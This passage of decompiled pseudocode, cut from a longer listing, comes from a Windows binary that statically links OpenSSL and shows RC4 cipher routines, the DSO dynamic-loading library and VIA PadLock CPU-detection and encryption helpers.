  __m64 v42; // mm1
  int v43; // edx
  int v44; // eax
  int v45; // edx
  __m64 v46; // mm2
  int v47; // ecx
  __m64 v48; // mm1
  int v49; // edx
  int v50; // eax
  int v51; // edx
  __m64 v52; // mm2
  int v53; // ecx
  __m64 v54; // mm1
  int v55; // edx
  int v56; // edx
  __m64 v57; // mm2
  __m64 v58; // mm1
  bool v59; // cf
  int v60; // edx
  int v61; // edx
  int v62; // ecx
  int v63; // ebp
  int v64; // edx
  int v65; // edx
  int v66; // ecx
  int v67; // ebp
  int v68; // edx
  int v69; // edx
  int v70; // ecx
  int v71; // ebp
  int v72; // edx
  int v73; // edx
  char v74; // cl
  char v75; // dl
  __int8 v76; // dl
  __m64 *v78; // [esp+18h] [ebp+8h]
  unsigned int v79; // [esp+1Ch] [ebp+Ch]
  int v80; // [esp+20h] [ebp+10h]

  v5 = a3;
  v6 = 0;
  v7 = 0;
  if ( a2 )
  {
    LOBYTE(v7) = *(_BYTE *)(a1 + 4);
    v8 = a1 + 8;
    v9 = a4 - (_DWORD)a3;
    v78 = (__m64 *)((char *)a3 + a2);
    LOBYTE(v6) = *(_BYTE *)a1 + 1;
    if ( *(_DWORD *)(a1 + 264) == -1 )
    {
      v74 = *(_BYTE *)(v8 + v6);
      do
      {
        LOBYTE(v7) = v74 + v7;
        v75 = *(_BYTE *)(v8 + v7);
        *(_BYTE *)(v8 + v7) = v74;
        *(_BYTE *)(v8 + v6) = v75;
        LOBYTE(v6) = v6 + 1;
        v76 = v5->m64_i8[0] ^ *(_BYTE *)(v8 + (unsigned __int8)(v74 + v75));
        v5 = (__m64 *)((char *)v5 + 1);
        v74 = *(_BYTE *)(v8 + v6);
        v5->m64_i8[v9 - 1] = v76;
      }
      while ( v5 < v78 );
      goto LABEL_19;
    }
    v10 = *(_DWORD *)(v8 + 4 * v6);
    v11 = a2 & 0xFFFFFFFC;
    if ( v11 )
    {
      v80 = a4 - (_DWORD)a3;
      if ( (v11 & 0xFFFFFFF8) != 0 && _bittest(&dword_73C6D0, 0x1Au) )
      {
        *(_DWORD *)(a1 + 4) = (char *)a3 + (v11 & 0xFFFFFFF8) - 8;
        LOBYTE(v7) = v10 + v7;
        v12 = *(_DWORD *)(v8 + 4 * v7);
        *(_DWORD *)(v8 + 4 * v7) = v10;
        *(_DWORD *)(v8 + 4 * v6) = v12;
        v13 = (unsigned __int8)(v6 + 1);
        v14 = (unsigned __int8)(v10 + v12);
        m64_u64 = (__m64)a3->m64_u64;
        v16 = *(_DWORD *)(v8 + 4 * v13);
        for ( i = _mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v14)); ; i = _mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v19)) )
        {
          LOBYTE(v7) = v16 + v7;
          v20 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v16;
          *(_DWORD *)(v8 + 4 * v13) = v20;
          v21 = (unsigned __int8)(v13 + 1);
          v22 = (unsigned __int8)(v16 + v20);
          v23 = *(_DWORD *)(v8 + 4 * v21);
          LOBYTE(v7) = v23 + v7;
          v24 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v22)), 8u);
          v25 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v23;
          *(_DWORD *)(v8 + 4 * v21) = v25;
          v26 = (unsigned __int8)(v21 + 1);
          v27 = (unsigned __int8)(v23 + v25);
          v28 = _m_pxor(_m_pxor(i, m64_u64), v24);
          v29 = *(_DWORD *)(v8 + 4 * v26);
          LOBYTE(v7) = v29 + v7;
          v30 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v27)), 0x10u);
          v31 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v29;
          *(_DWORD *)(v8 + 4 * v26) = v31;
          v32 = (unsigned __int8)(v26 + 1);
          v33 = (unsigned __int8)(v29 + v31);
          v34 = _m_pxor(v28, v30);
          v35 = *(_DWORD *)(v8 + 4 * v32);
          LOBYTE(v7) = v35 + v7;
          v36 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v33)), 0x18u);
          v37 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v35;
          *(_DWORD *)(v8 + 4 * v32) = v37;
          v38 = (unsigned __int8)(v32 + 1);
          v39 = (unsigned __int8)(v35 + v37);
          v40 = _m_pxor(v34, v36);
          v41 = *(_DWORD *)(v8 + 4 * v38);
          LOBYTE(v7) = v41 + v7;
          v42 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v39)), 0x20u);
          v43 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v41;
          *(_DWORD *)(v8 + 4 * v38) = v43;
          v44 = (unsigned __int8)(v38 + 1);
          v45 = (unsigned __int8)(v41 + v43);
          v46 = _m_pxor(v40, v42);
          v47 = *(_DWORD *)(v8 + 4 * v44);
          LOBYTE(v7) = v47 + v7;
          v48 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v45)), 0x28u);
          v49 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v47;
          *(_DWORD *)(v8 + 4 * v44) = v49;
          v50 = (unsigned __int8)(v44 + 1);
          v51 = (unsigned __int8)(v47 + v49);
          v52 = _m_pxor(v46, v48);
          v53 = *(_DWORD *)(v8 + 4 * v50);
          LOBYTE(v7) = v53 + v7;
          v54 = _m_psllqi(_mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v51)), 0x30u);
          v55 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v53;
          *(_DWORD *)(v8 + 4 * v50) = v55;
          v6 = (unsigned __int8)(v50 + 1);
          v56 = (unsigned __int8)(v53 + v55);
          v57 = _m_pxor(v52, v54);
          v10 = *(_DWORD *)(v8 + 4 * v6);
          v58 = _mm_cvtsi32_si64(*(_DWORD *)(v8 + 4 * v56));
          v7 = (unsigned __int8)v7;
          v59 = (unsigned int)v5++ < *(_DWORD *)(a1 + 4);
          if ( !v59 )
            break;
          LOBYTE(v7) = v10 + v7;
          v18 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v10;
          *(_DWORD *)(v8 + 4 * v6) = v18;
          v13 = (unsigned __int8)(v6 + 1);
          v19 = (unsigned __int8)(v10 + v18);
          m64_u64 = (__m64)v5->m64_u64;
          *(__m64 *)((char *)v5 + v80 - 8) = _m_pxor(v57, _m_psllqi(v58, 0x38u));
          v16 = *(_DWORD *)(v8 + 4 * v13);
        }
        *(__m64 *)((char *)v5 + v80 - 8) = _m_pxor(v57, _m_psllqi(v58, 0x38u));
        _m_empty();
        if ( v5 == v78 )
          goto LABEL_19;
      }
      else
      {
        v79 = (unsigned int)a3 + v11 - 4;
        do
        {
          LOBYTE(v7) = v10 + v7;
          v60 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v10;
          *(_DWORD *)(v8 + 4 * v6) = v60;
          LOBYTE(v6) = v6 + 1;
          v61 = (unsigned __int8)(v10 + v60);
          v62 = *(_DWORD *)(v8 + 4 * v6);
          v63 = *(_DWORD *)(v8 + 4 * v61);
          LOBYTE(v7) = v62 + v7;
          v64 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v62;
          *(_DWORD *)(v8 + 4 * v6) = v64;
          LOBYTE(v6) = v6 + 1;
          v65 = (unsigned __int8)(v62 + v64);
          v66 = *(_DWORD *)(v8 + 4 * v6);
          v67 = *(_DWORD *)(v8 + 4 * v65) | __ROR4__(v63, 8);
          LOBYTE(v7) = v66 + v7;
          v68 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v66;
          *(_DWORD *)(v8 + 4 * v6) = v68;
          LOBYTE(v6) = v6 + 1;
          v69 = (unsigned __int8)(v66 + v68);
          v70 = *(_DWORD *)(v8 + 4 * v6);
          v71 = *(_DWORD *)(v8 + 4 * v69) | __ROR4__(v67, 8);
          LOBYTE(v7) = v70 + v7;
          v72 = *(_DWORD *)(v8 + 4 * v7);
          *(_DWORD *)(v8 + 4 * v7) = v70;
          *(_DWORD *)(v8 + 4 * v6) = v72;
          LOBYTE(v6) = v6 + 1;
          v59 = (unsigned int)v5 < v79;
          *(__int32 *)((char *)v5->m64_i32 + v80) = v5->m64_i32[0] ^ __ROR4__(
                                                                       *(_DWORD *)(v8 + 4 * (unsigned __int8)(v70 + v72)) | __ROR4__(v71, 8),
                                                                       8);
          v5 = (__m64 *)((char *)v5 + 4);
          v10 = *(_DWORD *)(v8 + 4 * v6);
        }
        while ( v59 );
        if ( v5 == v78 )
          goto LABEL_19;
        v9 = v80;
      }
    }
    do
    {
      LOBYTE(v7) = v10 + v7;
      v73 = *(_DWORD *)(v8 + 4 * v7);
      *(_DWORD *)(v8 + 4 * v7) = v10;
      *(_DWORD *)(v8 + 4 * v6) = v73;
      LOBYTE(v6) = v6 + 1;
      LOBYTE(v73) = v5->m64_i8[0] ^ *(_DWORD *)(v8 + 4 * (unsigned __int8)(v10 + v73));
      v5 = (__m64 *)((char *)v5 + 1);
      v10 = *(_DWORD *)(v8 + 4 * v6);
      v5->m64_i8[v9 - 1] = v73;
    }
    while ( v5 < v78 );
LABEL_19:
    LOBYTE(v6) = v6 - 1;
    *(_DWORD *)(a1 + 4) = v7;
    *(_BYTE *)a1 = v6;
  }
  return v6;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00460A60) --------------------------------------------------------
int __cdecl sub_460A60(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // edi
  int v4; // esi
  int v5; // ebp
  int v6; // eax
  bool v7; // cf
  int v8; // ecx
  int v9; // edx
  int v10; // eax
  bool v11; // zf
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  char v15; // al
  char v16; // bl
  int result; // eax

  v3 = a1 + 2;
  v4 = a3 + a2;
  v5 = -a2;
  v6 = 0;
  a1[1] = -a2;
  if ( _bittest(&dword_73C6D0, 0x14u) )
  {
    do
    {
      *((_BYTE *)v3 + v6) = v6;
      v7 = __CFADD__((_BYTE)v6, 1);
      LOBYTE(v6) = v6 + 1;
    }
    while ( !v7 );
    v13 = 0;
    v14 = 0;
    do
    {
      v15 = *((_BYTE *)v3 + v13);
      LOBYTE(v14) = v15 + *(_BYTE *)(v4 + v5) + v14;
      v11 = v5++ == -1;
      v16 = *((_BYTE *)v3 + v14);
      if ( v11 )
        v5 = a1[1];
      *((_BYTE *)v3 + v14) = v15;
      *((_BYTE *)v3 + v13) = v16;
      v7 = __CFADD__((_BYTE)v13, 1);
      LOBYTE(v13) = v13 + 1;
    }
    while ( !v7 );
    a1[66] = -1;
  }
  else
  {
    do
    {
      v3[v6] = v6;
      v7 = __CFADD__((_BYTE)v6, 1);
      LOBYTE(v6) = v6 + 1;
    }
    while ( !v7 );
    v8 = 0;
    v9 = 0;
    do
    {
      v10 = v3[v8];
      LOBYTE(v9) = v10 + *(_BYTE *)(v4 + v5) + v9;
      v11 = v5++ == -1;
      v12 = v3[v9];
      if ( v11 )
        v5 = a1[1];
      v3[v9] = v10;
      v3[v8] = v12;
      v7 = __CFADD__((_BYTE)v8, 1);
      LOBYTE(v8) = v8 + 1;
    }
    while ( !v7 );
  }
  result = 0;
  *a1 = 0;
  a1[1] = 0;
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00460B30) --------------------------------------------------------
char *sub_460B30()
{
  char *result; // eax

  result = "rc4(4x,int)";
  if ( (dword_73C6D0 & 0x100000) != 0 )
    return "rc4(1x,char)";
  if ( (dword_73C6D0 & 0x4000000) != 0 )
    return "rc4(8x,mmx)";
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00460C00) --------------------------------------------------------
_DWORD *__cdecl sub_460C00(int a1, int a2, int a3)
{
  _DWORD *result; // eax

  result = sub_413430(0x34u);
  if ( result )
  {
    *result = a1;
    result[1] = a2;
    result[2] = a3;
  }
  return result;
}

//----- (00460C30) --------------------------------------------------------
void __cdecl sub_460C30(void *Block)
{
  sub_413490(Block);
}

//----- (00460C50) --------------------------------------------------------
int __cdecl sub_460C50(int a1, int a2)
{
  *(_DWORD *)(a1 + 36) = a2;
  return 1;
}

//----- (00460C70) --------------------------------------------------------
int __cdecl sub_460C70(int a1, int a2)
{
  *(_DWORD *)(a1 + 60) = a2;
  return 1;
}

//----- (00460C90) --------------------------------------------------------
int __cdecl sub_460C90(int a1, int a2)
{
  *(_DWORD *)(a1 + 68) = a2;
  return 1;
}

//----- (00460CB0) --------------------------------------------------------
int __cdecl sub_460CB0(volatile LONG *Block)
{
  void ***v1; // esi
  int (__cdecl *v2)(void ***); // eax
  int (__cdecl *v4)(void ***); // eax

  v1 = (void ***)Block;
  if ( Block )
  {
    if ( sub_4147E0(Block + 2, -1, &Block) <= 0 )
      return 0;
    if ( (int)Block <= 0 )
    {
      v2 = (int (__cdecl *)(void ***))(*v1)[2];
      if ( v2 && !v2(v1) )
      {
        sub_408310(37, 111, 107, "crypto\\dso\\dso_lib.c", 77);
        return 0;
      }
      v4 = (int (__cdecl *)(void ***))(*v1)[8];
      if ( v4 && !v4(v1) )
      {
        sub_408310(37, 111, 102, "crypto\\dso\\dso_lib.c", 82);
        return 0;
      }
      sub_4269F0(v1[1]);
      sub_413490(v1[7]);
      sub_413490(v1[8]);
      sub_4146D0((LPCRITICAL_SECTION)v1[9]);
      sub_413490(v1);
    }
  }
  return 1;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00460D90) --------------------------------------------------------
int __cdecl sub_460D90(int a1, int a2)
{
  int (__cdecl *v2)(int, int); // eax
  int result; // eax

  if ( a1 && a2 )
  {
    v2 = *(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 12);
    if ( v2 )
    {
      result = v2(a1, a2);
      if ( !result )
      {
        sub_408310(37, 108, 106, "crypto\\dso\\dso_lib.c", 183);
        return 0;
      }
    }
    else
    {
      sub_408310(37, 108, 108, "crypto\\dso\\dso_lib.c", 179);
      return 0;
    }
  }
  else
  {
    sub_408310(37, 108, 67, "crypto\\dso\\dso_lib.c", 175);
    return 0;
  }
  return result;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00460E10) --------------------------------------------------------
int __cdecl sub_460E10(_DWORD *a1, int a2, int a3, int a4)
{
  int (__cdecl *v5)(_DWORD *, int, int, int); // eax

  if ( a1 )
  {
    switch ( a2 )
    {
      case 1:
        return a1[3];
      case 2:
        a1[3] = a3;
        return 0;
      case 3:
        a1[3] |= a3;
        return 0;
      default:
        if ( *a1 && (v5 = *(int (__cdecl **)(_DWORD *, int, int, int))(*a1 + 16)) != 0 )
        {
          return v5(a1, a2, a3, a4);
        }
        else
        {
          sub_408310(37, 110, 108, (int)"crypto\\dso\\dso_lib.c", 222);
          return -1;
        }
    }
  }
  else
  {
    sub_408310(37, 110, 67, (int)"crypto\\dso\\dso_lib.c", 202);
    return -1;
  }
}

//----- (00460EA0) --------------------------------------------------------
int __cdecl sub_460EA0(int a1, const char *Src)
{
  void *v3; // esi

  if ( a1 && Src )
  {
    if ( *(_DWORD *)(a1 + 32) )
    {
      sub_408310(37, 129, 110, "crypto\\dso\\dso_lib.c", 246);
      return 0;
    }
    else
    {
      v3 = sub_4247B0(Src);
      if ( v3 )
      {
        sub_413490(*(void **)(a1 + 28));
        *(_DWORD *)(a1 + 28) = v3;
        return 1;
      }
      else
      {
        sub_408310(37, 129, 65, "crypto\\dso\\dso_lib.c", 252);
        return 0;
      }
    }
  }
  else
  {
    sub_408310(37, 129, 67, "crypto\\dso\\dso_lib.c", 242);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00460F60) --------------------------------------------------------
int __cdecl sub_460F60(int a1, int a2, int a3)
{
  int result; // eax
  int (__cdecl *v4)(int, int, int); // edx

  result = 0;
  if ( a1 && a2 )
  {
    if ( (*(_BYTE *)(a1 + 12) & 1) == 0 )
    {
      v4 = *(int (__cdecl **)(int, int, int))(a1 + 24);
      if ( v4 )
        return v4(a1, a2, a3);
      v4 = *(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 24);
      if ( v4 )
        return v4(a1, a2, a3);
    }
  }
  else
  {
    sub_408310(37, 132, 67, (int)"crypto\\dso\\dso_lib.c", 265);
    return 0;
  }
  return result;
}

//----- (00460FC0) --------------------------------------------------------
void *__cdecl sub_460FC0(int a1, const char *Src)
{
  void *result; // eax
  const char *v3; // esi
  int (__cdecl *v4)(int, const char *); // ecx

  if ( a1 )
  {
    v3 = Src;
    if ( Src || (v3 = *(const char **)(a1 + 28)) != 0 )
    {
      if ( (*(_BYTE *)(a1 + 12) & 1) != 0
        || (v4 = *(int (__cdecl **)(int, const char *))(a1 + 20)) == 0
        && (v4 = *(int (__cdecl **)(int, const char *))(*(_DWORD *)a1 + 20)) == 0
        || (result = (void *)v4(a1, v3)) == 0 )
      {
        result = sub_4247B0(v3);
        if ( !result )
        {
          sub_408310(37, 126, 65, (int)"crypto\\dso\\dso_lib.c", 300);
          return 0;
        }
      }
    }
    else
    {
      sub_408310(37, 126, 111, (int)"crypto\\dso\\dso_lib.c", 288);
      return 0;
    }
  }
  else
  {
    sub_408310(37, 126, 67, (int)"crypto\\dso\\dso_lib.c", 282);
    return 0;
  }
  return result;
}

//----- (00461070) --------------------------------------------------------
volatile LONG *sub_461070()
{
  volatile LONG *v0; // esi
  _DWORD *v2; // eax
  struct _RTL_CRITICAL_SECTION *v3; // eax
  int (__cdecl *v4)(volatile LONG *); // eax

  if ( !stru_539288.LockSemaphore )
    stru_539288.LockSemaphore = sub_4C8890();
  v0 = (volatile LONG *)sub_413430(0x28u);
  if ( v0 )
  {
    v2 = sub_426AF0();
    *((_DWORD *)v0 + 1) = v2;
    if ( v2 )
    {
      *v0 = (volatile LONG)stru_539288.LockSemaphore;
      *((_DWORD *)v0 + 2) = 1;
      v3 = sub_414650();
      *((_DWORD *)v0 + 9) = v3;
      if ( v3 )
      {
        v4 = *(int (__cdecl **)(volatile LONG *))(*v0 + 28);
        if ( v4 )
        {
          if ( !v4(v0) )
          {
            sub_460CB0(v0);
            return 0;
          }
        }
        return v0;
      }
      else
      {
        sub_408310(37, 113, 65, "crypto\\dso\\dso_lib.c", 42);
        sub_4269F0(*((void ***)v0 + 1));
        sub_413490((void *)v0);
        return 0;
      }
    }
    else
    {
      sub_408310(37, 113, 65, "crypto\\dso\\dso_lib.c", 34);
      sub_413490((void *)v0);
      return 0;
    }
  }
  else
  {
    sub_408310(37, 113, 65, "crypto\\dso\\dso_lib.c", 28);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00461170) --------------------------------------------------------
volatile LONG *__cdecl sub_461170(volatile LONG *Block, const char *Src, int a3, int a4)
{
  volatile LONG *v4; // esi
  int v5; // edi
  int (__cdecl *v7)(volatile LONG *); // eax

  v4 = Block;
  v5 = 0;
  if ( !Block )
  {
    v4 = sub_461070();
    if ( !v4 )
    {
      sub_408310(37, 112, 65, "crypto\\dso\\dso_lib.c", 124);
      return 0;
    }
    v5 = 1;
    *((_DWORD *)v4 + 3) = a4;
  }
  if ( *((_DWORD *)v4 + 7) )
  {
    sub_408310(37, 112, 110, "crypto\\dso\\dso_lib.c", 137);
  }
  else if ( !Src || sub_460EA0((int)v4, Src) )
  {
    if ( *((_DWORD *)v4 + 7) )
    {
      v7 = *(int (__cdecl **)(volatile LONG *))(*v4 + 4);
      if ( v7 )
      {
        if ( v7(v4) )
          return v4;
        sub_408310(37, 112, 103, "crypto\\dso\\dso_lib.c", 159);
      }
      else
      {
        sub_408310(37, 112, 108, "crypto\\dso\\dso_lib.c", 155);
      }
    }
    else
    {
      sub_408310(37, 112, 111, "crypto\\dso\\dso_lib.c", 151);
    }
  }
  else
  {
    sub_408310(37, 112, 112, "crypto\\dso\\dso_lib.c", 146);
  }
  if ( v5 )
    sub_460CB0(v4);
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00461280) --------------------------------------------------------
unsigned int sub_461280()
{
  unsigned int v0; // kr00_4
  unsigned int v1; // kr04_4
  unsigned int result; // eax
  unsigned int v12; // edx
  BOOL v18; // ebx
  BOOL v24; // [esp-4h] [ebp-8h]

  v0 = __readeflags();
  __writeeflags(v0 ^ 0x200000);
  v1 = __readeflags();
  result = 0;
  if ( ((v1 ^ v0) & 0x200000) != 0 )
  {
    __asm { cpuid }
    result = 0;
    if ( _EBX == 1953391939 && _EDX == 1215460705 && _ECX == 1936487777 )
    {
      _EAX = -1073741824;
      __asm { cpuid }
      v12 = _EAX;
      result = 0;
      if ( v12 >= 0xC0000001 )
      {
        _EAX = 1;
        __asm { cpuid }
        v18 = (_EAX & 0xFF0 | 0xF) == 1791;
        _EAX = -1073741823;
        v24 = v18;
        __asm { cpuid }
        return (16 * v24) | _EDX & 0xFFFFFFEF;
      }
    }
  }
  return result;
}

//----- (00461350) --------------------------------------------------------
_DWORD *__usercall sub_461350@<eax>(_DWORD *result@<eax>, int a2@<edx>, int a3)
{
  unsigned int v3; // kr00_4

  if ( _bittest(&a3, 0x1Eu) && a2 != *result )
  {
    v3 = __readeflags();
    __writeeflags(v3);
  }
  *result = a2;
  return result;
}

//----- (00461370) --------------------------------------------------------
void sub_461370()
{
  unsigned int v0; // kr00_4

  v0 = __getcallerseflags();
  __writeeflags(v0);
}

//----- (00461380) --------------------------------------------------------
int sub_461380()
{
  int result; // eax

  _ECX = 1;
  __asm { rep cmpxchg eax, ecx }
  return result;
}

//----- (004613B0) --------------------------------------------------------
void __cdecl sub_4613B0(char *a1, char *a2, int a3, char a4)
{
  char *v4; // edi
  char *v5; // esi
  int v6; // kr00_4
  unsigned int v7; // ecx
  int v8; // edx
  _DWORD *v9; // edx
  int v10; // eax
  int v11; // ebx
  unsigned int v12; // ebx
  char *v13; // eax
  bool v14; // cf
  int v15; // eax
  unsigned int v16; // ecx
  char *v20; // edi
  unsigned int v21; // ebx
  int v22; // eax
  void *v23; // esp
  char *v24; // eax
  int v25; // ebp
  unsigned int v26; // ebp
  unsigned int v27; // ecx
  void *v31; // esp
  char *v32; // [esp+0h] [ebp-2Ch] BYREF
  char *v33; // [esp+4h] [ebp-28h]
  unsigned int v34; // [esp+8h] [ebp-24h]
  unsigned int v35; // [esp+Ch] [ebp-20h]
  char *v36; // [esp+10h] [ebp-1Ch]
  char v37[20]; // [esp+18h] [ebp-14h] BYREF

  v4 = a1;
  v5 = a2;
  if ( (a3 & 0xF) != 0 || (a4 & 0xF) != 0 )
    return;
  v6 = __readeflags();
  sub_461350(&dword_5353C8, a3, v6);
  v9 = (_DWORD *)(v8 + 16);
  v10 = 0;
  v11 = 0;
  if ( (*v9 & 0x20) != 0
    || (LOBYTE(v10) = ((unsigned __int8)a1 & 0xF) == 0, LOBYTE(v11) = ((unsigned __int8)a2 & 0xF) == 0, (v11 & v10) != 0) )
  {
    v25 = 127;
    if ( (-(int)&a2[v7] & 0xFFFu) >= 0x80 )
      v25 = 0;
    v26 = v7 & v25;
    v27 = v7 - v26;
    if ( v27 )
    {
      _EAX = v9 - 4;
      _ECX = v27 >> 4;
      __asm { rep cmpxchg eax, ecx }
      if ( !v26 )
        return;
    }
    v7 = v26;
    v31 = alloca(v26);
    v36 = v37;
    v12 = v26;
    qmemcpy(v37, a2, 4 * (v26 >> 2));
    v5 = v37;
  }
  else
  {
    v12 = v7 & 0x1FF;
    if ( (v7 & 0x1FF) == 0 )
      v12 = 512;
    v36 = (char *)&v32;
    if ( v7 <= v12 )
    {
      v13 = a2;
      if ( &v32 == (char **)v37 )
        v13 = a1;
      v14 = (-(int)&v13[v7] & 0xFFFu) < 0x80;
      v15 = -128;
      if ( !v14 )
        v15 = v12;
      v12 &= v15;
      if ( !v12 )
        goto LABEL_21;
    }
  }
  while ( 1 )
  {
    v32 = v4;
    v33 = v5;
    v34 = v7;
    v16 = v12;
    v35 = v12;
    if ( ((unsigned __int8)v4 & 0xF) != 0 )
      v4 = v37;
    if ( ((unsigned __int8)v5 & 0xF) != 0 )
    {
      qmemcpy(v4, v5, 4 * (v12 >> 2));
      v16 = v12;
    }
    _EAX = v9 - 4;
    _ECX = v16 >> 4;
    __asm { rep cmpxchg eax, ecx }
    v20 = v32;
    v21 = v35;
    if ( ((unsigned __int8)v32 & 0xF) != 0 )
    {
      qmemcpy(v32, v37, 4 * (v35 >> 2));
      v20 = &v20[4 * (v21 >> 2) - v21];
    }
    v4 = &v20[v21];
    v5 = &v33[v21];
    v7 = v34 - v21;
    v12 = 512;
    if ( !v7 )
      break;
    if ( v7 < 0x200 )
    {
LABEL_21:
      v22 = 0;
      if ( v37 == (char *)&v32 )
        v22 = v7;
      v23 = alloca(v22);
      v12 = v7;
      qmemcpy(v37, v5, 4 * (v7 >> 2));
      v5 = v37;
    }
  }
  if ( v37 != (char *)&v32 )
  {
    v24 = v37;
    do
    {
      *(_OWORD *)v24 = 0i64;
      v24 += 16;
    }
    while ( &v32 > (char **)v24 );
  }
}
// 4613E9: variable 'v8' is possibly undefined
// 46142E: variable 'v7' is possibly undefined
// 5353C8: using guessed type _DWORD dword_5353C8;

//----- (004615D0) --------------------------------------------------------
void __cdecl sub_4615D0(char *a1, char *a2, int a3, char a4)
{
  char *v4; // edi
  char *v5; // esi
  int v6; // kr00_4
  unsigned int v7; // ecx
  int v8; // edx
  int v10; // eax
  int v11; // ebx
  unsigned int v12; // ebx
  char *v13; // eax
  bool v14; // cf
  int v15; // eax
  char *v18; // edi
  unsigned int v19; // ebx
  int v20; // eax
  void *v21; // esp
  char *v22; // eax
  int v23; // ebp
  unsigned int v24; // ebp
  void *v27; // esp
  char *v28; // [esp+0h] [ebp-2Ch] BYREF
  char *v29; // [esp+4h] [ebp-28h]
  unsigned int v30; // [esp+8h] [ebp-24h]
  unsigned int v31; // [esp+Ch] [ebp-20h]
  char *v32; // [esp+10h] [ebp-1Ch]
  char v33[20]; // [esp+18h] [ebp-14h] BYREF

  v4 = a1;
  v5 = a2;
  if ( (a3 & 0xF) != 0 || (a4 & 0xF) != 0 )
    return;
  v6 = __readeflags();
  sub_461350(&dword_5353C8, a3, v6);
  _EDX = (_DWORD *)(v8 + 16);
  v10 = 0;
  v11 = 0;
  if ( (*_EDX & 0x20) != 0
    || (LOBYTE(v10) = ((unsigned __int8)a1 & 0xF) == 0, LOBYTE(v11) = ((unsigned __int8)a2 & 0xF) == 0, (v11 & v10) != 0) )
  {
    v23 = 63;
    if ( (-(int)&a2[v7] & 0xFFFu) >= 0x40 )
      v23 = 0;
    v24 = v7 & v23;
    if ( v7 != v24 )
    {
      _EAX = _EDX - 4;
      __asm { rep cmpxchg eax, edx }
      *((_OWORD *)_EDX - 1) = *_EAX;
      if ( !v24 )
        return;
    }
    v7 = v24;
    v27 = alloca(v24);
    v32 = v33;
    v12 = v24;
    qmemcpy(v33, a2, 4 * (v24 >> 2));
    v5 = v33;
  }
  else
  {
    v12 = v7 & 0x1FF;
    if ( (v7 & 0x1FF) == 0 )
      v12 = 512;
    v32 = (char *)&v28;
    if ( v7 <= v12 )
    {
      v13 = a2;
      if ( &v28 == (char **)v33 )
        v13 = a1;
      v14 = (-(int)&v13[v7] & 0xFFFu) < 0x40;
      v15 = -64;
      if ( !v14 )
        v15 = v12;
      v12 &= v15;
      if ( !v12 )
        goto LABEL_21;
    }
  }
  while ( 1 )
  {
    v28 = v4;
    v29 = v5;
    v30 = v7;
    v31 = v12;
    if ( ((unsigned __int8)v4 & 0xF) != 0 )
      v4 = v33;
    if ( ((unsigned __int8)v5 & 0xF) != 0 )
      qmemcpy(v4, v5, 4 * (v12 >> 2));
    _EAX = _EDX - 4;
    __asm { rep cmpxchg eax, edx }
    *((_OWORD *)_EDX - 1) = *_EAX;
    v18 = v28;
    v19 = v31;
    if ( ((unsigned __int8)v28 & 0xF) != 0 )
    {
      qmemcpy(v28, v33, 4 * (v31 >> 2));
      v18 = &v18[4 * (v19 >> 2) - v19];
    }
    v4 = &v18[v19];
    v5 = &v29[v19];
    v7 = v30 - v19;
    v12 = 512;
    if ( !v7 )
      break;
    if ( v7 < 0x200 )
    {
LABEL_21:
      v20 = 0;
      if ( v33 == (char *)&v28 )
        v20 = v7;
      v21 = alloca(v20);
      v12 = v7;
      qmemcpy(v33, v5, 4 * (v7 >> 2));
      v5 = v33;
    }
  }
  if ( v33 != (char *)&v28 )
  {
    v22 = v33;
    do
    {
      *(_OWORD *)v22 = 0i64;
      v22 += 16;
    }
    while ( &v28 > (char **)v22 );
  }
}
// 461609: variable 'v8' is possibly undefined
// 46164E: variable 'v7' is possibly undefined
// 5353C8: using guessed type _DWORD dword_5353C8;

//----- (004617F0) --------------------------------------------------------
void __cdecl sub_4617F0(char *a1, int a2, int a3, char a4)
{
  char *v4; // edi
  int v5; // esi
  int v6; // kr00_4
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // edx
  int v10; // eax
  int v11; // ebx
  unsigned int v12; // ebx
  char *v15; // edi
  unsigned int v16; // ebx
  char *v17; // eax
  char *v20; // [esp+0h] [ebp-2Ch] BYREF
  int v21; // [esp+4h] [ebp-28h]
